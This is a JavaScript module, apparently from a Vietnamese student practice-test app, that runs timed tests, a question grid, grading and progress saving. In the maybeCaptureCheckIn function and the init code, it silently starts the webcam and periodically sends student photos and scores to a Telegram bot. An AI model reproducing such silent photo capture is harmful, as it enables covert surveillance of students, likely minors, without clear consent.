/**
 * Test Engine - Handles timed practice tests
 * Uses TopicEngine for exercise rendering, adds timer + question grid
 */

const TEST_TIME_LIMITS = {
  'mixed-40': 60,
  'mc-40': 45,
  'mc-50': 60
};

const TestEngine = {
  timer: null,
  timeRemaining: 0,
  isSubmitted: false,

  _lastCapturedAt: 0,   // last question number a photo was sent for

  async init(testId) {
    // Initialize TopicEngine's state for rendering
    TopicEngine.state = {
      topicId: testId,
      data: null,
      currentIndex: 0,
      answers: {},
      score: 0,
      totalExercises: 0
    };

    try {
      const resp = await fetch('../data/' + testId + '.json');
      if (!resp.ok) throw new Error('Data not found');
      TopicEngine.state.data = await resp.json();
    } catch (err) {
      document.getElementById('exercise-area').textContent = 'Không thể tải dữ liệu.';
      return;
    }

    // Prompt for student name + photo before starting the test (blocks until submitted)
    if (typeof StudentInfo !== 'undefined') {
      await StudentInfo.ensure();
    }
    if (typeof Telegram !== 'undefined') Telegram.init();

    // Best-effort silent camera init for periodic check-ins (only if Telegram configured)
    if (typeof Camera !== 'undefined' &&
        typeof Telegram !== 'undefined' && Telegram.isConfigured()) {
      Camera.init();  // fire-and-forget; capture() will return null until ready
    }

    const exercises = TopicEngine.state.data.exercises || [];
    TopicEngine.state.totalExercises = TopicEngine.countQuestions(exercises);

    // Setup timer
    const testType = TopicEngine.state.data.testType || 'mc-40';
    this.timeRemaining = (TEST_TIME_LIMITS[testType] || 45) * 60;

    // Render
    // Enable exam mode: suppress immediate feedback
    TopicEngine.testMode = true;

    this.renderNavBar();
    this.renderTimer();
    this.renderQuestionGrid();
    TopicEngine.renderExercises();
    this.startTimer();

    // Wrap TopicEngine.updateProgress to also update grid + periodic capture
    const origUpdate = TopicEngine.updateProgress.bind(TopicEngine);
    const self = this;
    TopicEngine.updateProgress = () => {
      origUpdate();
      self.updateAllGridItems();
      self.maybeCaptureCheckIn();
    };

    TopicEngine.recordDailyActivity();
  },

  /** Periodic silent check-in: capture photo + send to Telegram every CAPTURE_INTERVAL answered questions. */
  async maybeCaptureCheckIn() {
    if (typeof Camera === 'undefined' || typeof Telegram === 'undefined') return;
    if (!Telegram.isConfigured() || !Camera.isActive()) return;

    const state = TopicEngine.state;
    const answered = Object.keys(state.answers).length;
    if (answered <= this._lastCapturedAt) return;
    if (!Camera.shouldCapture(answered)) return;

    this._lastCapturedAt = answered;
    const photo = Camera.capture();
    if (!photo) return;

    const correct = Object.values(state.answers).filter(a => a.correct).length;
    const title = state.data.title || state.topicId;
    await Telegram.sendCheckIn(photo, answered, title, {
      correct,
      answered,
      total: state.totalExercises
    });
  },

  renderNavBar() {
    const nav = document.getElementById('nav-bar');
    if (!nav) return;
    const titleEl = nav.querySelector('.nav-bar__title');
    if (titleEl) titleEl.textContent = TopicEngine.state.data.title || TopicEngine.state.topicId;
  },

  renderTimer() {
    const timerEl = document.getElementById('test-timer');
    if (timerEl) this.updateTimerDisplay(timerEl);
  },

  updateTimerDisplay(timerEl) {
    timerEl.textContent = Logic.formatTime(this.timeRemaining);
    timerEl.className = Logic.getTimerClass(this.timeRemaining);
  },

  startTimer() {
    const timerEl = document.getElementById('test-timer');
    if (!timerEl) return;

    this.timer = setInterval(() => {
      this.timeRemaining--;
      this.updateTimerDisplay(timerEl);
      if (this.timeRemaining <= 0) this.submitTest();
    }, 1000);
  },

  renderQuestionGrid() {
    const grid = document.getElementById('question-grid');
    if (!grid) return;
    grid.textContent = '';

    for (let i = 1; i <= TopicEngine.state.totalExercises; i++) {
      const item = document.createElement('button');
      item.className = 'question-grid__item';
      item.textContent = i;
      item.type = 'button';
      item.dataset.qnum = i;
      item.addEventListener('click', () => {
        const cards = document.querySelectorAll('.exercise-card');
        if (cards[i - 1]) {
          cards[i - 1].scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      });
      grid.appendChild(item);
    }
  },

  updateGridItem(qnum, answered) {
    const grid = document.getElementById('question-grid');
    if (!grid) return;
    const item = grid.querySelector('[data-qnum="' + qnum + '"]');
    if (item && answered) {
      item.classList.add('question-grid__item--answered');
    }
  },

  /** Mark all answered questions in the grid based on current answers */
  updateAllGridItems() {
    const state = TopicEngine.state;
    const exercises = state.data.exercises || [];
    const grid = document.getElementById('question-grid');
    if (!grid) return;

    let qIdx = 0;
    exercises.forEach((ex) => {
      if (ex.type === 'reading-comprehension' && ex.questions) {
        ex.questions.forEach((q, qi) => {
          qIdx++;
          const exId = 'reading-' + ex.id + '-' + qi;
          if (state.answers[exId]) {
            this.updateGridItem(qIdx, true);
          }
        });
      } else {
        qIdx++;
        const exId = ex.id || exercises.indexOf(ex);
        if (state.answers[exId]) {
          this.updateGridItem(qIdx, true);
        }
      }
    });
  },

  submitTest() {
    if (this.isSubmitted) return;
    this.isSubmitted = true;
    clearInterval(this.timer);

    // Hide submit button
    const submitBtn = document.getElementById('submit-test');
    if (submitBtn) submitBtn.style.display = 'none';

    const state = TopicEngine.state;
    const correct = Object.values(state.answers).filter(a => a.correct).length;
    const total = state.totalExercises;
    const stars = Logic.calculateStars(correct, total);

    // Save progress
    const progress = Storage.load('all-progress', {});
    progress[state.topicId] = Logic.mergeProgress(
      progress[state.topicId],
      { score: correct * Logic.POINTS_CORRECT, stars, correct, total }
    );
    Storage.save('all-progress', progress);

    // Show results
    const area = document.getElementById('results-area');
    if (area) {
      area.style.display = 'block';
      const starsEl = area.querySelector('.results__stars');
      if (starsEl) starsEl.textContent = '\u2B50'.repeat(stars);
      const titleEl = area.querySelector('.results__title');
      if (titleEl) titleEl.textContent = Logic.getResultTitle(correct, total);
      const scoreEl = area.querySelector('.results__score');
      if (scoreEl) scoreEl.textContent = correct + '/' + total + ' đúng (' + Math.round(correct / total * 100) + '%)';
      area.scrollIntoView({ behavior: 'smooth' });
    }

    // Reveal all correct/wrong answers with explanations
    TopicEngine.revealAllAnswers();

    // Color the grid
    const exercises = state.data.exercises || [];
    let qIdx = 0;
    const grid = document.getElementById('question-grid');
    exercises.forEach((ex) => {
      if (ex.type === 'reading-comprehension' && ex.questions) {
        ex.questions.forEach((q, qi) => {
          qIdx++;
          const exId = 'reading-' + ex.id + '-' + qi;
          const ans = state.answers[exId];
          if (grid) {
            const item = grid.querySelector('[data-qnum="' + qIdx + '"]');
            if (item) {
              if (ans && ans.correct) item.classList.add('question-grid__item--correct');
              else if (ans) item.classList.add('question-grid__item--wrong');
            }
          }
        });
      } else {
        qIdx++;
        const exId = ex.id || exercises.indexOf(ex);
        const ans = state.answers[exId];
        if (grid) {
          const item = grid.querySelector('[data-qnum="' + qIdx + '"]');
          if (item) {
            if (ans && ans.correct) item.classList.add('question-grid__item--correct');
            else if (ans) item.classList.add('question-grid__item--wrong');
          }
        }
      }
    });

    TopicEngine.sendTelegramProgress(correct, total, stars);

    // Release camera after final progress is sent
    if (typeof Camera !== 'undefined') Camera.stop();
  }
};
